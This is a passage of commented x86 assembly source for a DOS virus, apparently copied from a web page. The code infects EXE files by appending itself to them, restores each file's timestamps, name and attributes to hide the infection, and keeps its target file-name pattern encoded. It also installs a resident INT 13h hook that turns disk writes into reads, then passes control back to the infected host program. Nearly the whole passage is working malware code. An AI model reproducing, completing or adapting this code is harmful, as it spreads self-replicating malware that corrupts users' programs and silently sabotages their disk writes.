             int  21h                  ; move relatively to start
  
;  Write alignement (no matter what, only number is important)
  
             mov  cx, bp               ; get alignement amount
  
             mov  ah, 40h              ; DOS Write_Handle function
             int  21h                  ; write CX bytes
  
;  Now prepare to append itself to EXE file
  
;  First encode EXE name patter anew
  
             mov  si, offset file_name   ; DS:SI points to name pattern
             mov  cx, 5                  ; it is 5 characters long
  
next_lttr:   dec  byte ptr [si]          ; encode by decrement
             inc  si
             loop next_lttr              ; encode all 5 characters
  
;  All ready, append itself now
  
             xor  dx, dx                 ; DX = 0, start offset for virus code
             mov  cx, virus_length       ; CX = number of bytes to write
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  No further action involving file will be taken, so restore it's state
  
             call restore_and_close      ; restore date and time, close file
  
;  Restore jump to this mother code
  
             mov  ax, [aux_CS]         ; restore jump addres via AX
             mov  [old_CS], ax
             mov  ax, [aux_IP]
             mov  [old_IP], ax
  
;  All done with infecting, prepare to execute mother
  
;  Restore original DTA
  
             push ds                   ; preserve DS (now DS = CODE)
  
    exit:    lds  dx, old_DTA          ; get original DTA address to DS:DX
  
             mov  ah, 1Ah              ; DOS Set_DTA function
             int  21h
  
;  Check if install new INT_13 vector
  
             cmp  [install_flag], 0    ; 0 means no installing
  
             jz   set_DS               ; omit installing
  
;  Install  resident part
  
             mov  ax, resident_CS      ; load CS for resident to DS (via AX)
             mov  ds, ax
             xor  dx, dx               ; DS:DX = address of resident part
  
             mov  ax, 2513h            ; DOS Set_Interrupt_Vector function
             int  21h                  ; set vector for INT_13
  
set_DS:      pop  ds                   ; restore DS to CODE
  
             mov  bx, [old_SS]         ; BX = original SS
             mov  cx, [old_SP]         ; CX = original SP
  
             pop  es                   ; restore original DS and ES
             pop  ds
  
             cli                       ; disable hardware interrupts
             mov  sp, cx               ; while restoring original SS:SP
             mov  ss, bx
             sti                       ; enable hardware interrupts
  
;  Virus has done all its job, now let mother do its own
  
    jump:    jmp  dummy:d_end          ; jump to original code
  
  
;-----------  here is the one and only procedure -------------------;
  
    restore_and_close  proc  near
  
;  Restore original file time and date
  
             mov  cx, [time]           ; get saved time
             mov  dx, [date]           ; get saved date
  
             mov  ax, 5701h               ; DOS Set_File_Time_Date function
             int  21h                     ; time set as CX, date as DX
  
;  Close file
  
             mov  ah, 3Eh              ; DOS Close_File function
             int  21h
  
;  Restore original name
  
             mov  dx, offset new_name    ; DS:DX points to new name
             mov  di, offset found_name  ; ES:DI points to original name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
; Restore original file attributes
  
             mov  dx, offset found_name   ; restore attributes
             mov  cx, [attributes]
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes set as CX
  
             ret
  
    restore_and_close  endp
  
  
;------------ and here go the resident part of the virus -------------;
  
resident:    pushf                   ; save flags
  
             cmp  ah, 3              ; is it Disk_Write_1 ?
             jnz l1                  ; no, check Disk_Write_2
  
             mov  ah, 2              ; yes, convert to Disk_Read_1
             jmp  short  call_int    ; and exit resident
  
      l1:    cmp  ah, 0Bh            ; is it Disk_Write_2 ?
             jnz  call_int           ; no, exit resident
  
             mov  ah, 0Ah            ; yes, convert to Disk_Read_2
  
call_int:    popf                    ; restore flags
  
  
;  Next 5 bytes form long jump to original INT_13 handler
  
             db   0EAh               ; means JMP FAR
  
int_IP       dw   0                  ; and here the address to jump to
int_CS       dw   0
  
resident_size  equ  $ - resident
  
;-------- now data for virus, just encoded file name pattern -------;
  
    file_name  db  ')-DWD', 0
  
;-------------------------------------------------------------------;
;                                                                   ;
;         Here VIRUS ends. The rest are purely placeholders         ;
;                                                                   ;
;-------------------------------------------------------------------;
  
;*******************************************************************;

    header   dw   13 dup (0)

    old_SS   dw   0
    old_SP   dw   0

    aux_CS   dw   0
    aux_IP   dw   0

    old_DTA  dd   0

    time     dw   0
    date     dw   0

    attributes  dw  0

    install_flag db 0

    new_name    db  9 dup (0)

    DTA      dw   2Ch dup (0)

    aux      dw   2 dup (0)

    code     ends

             end  start

</textarea></td></tr></table></body></html>
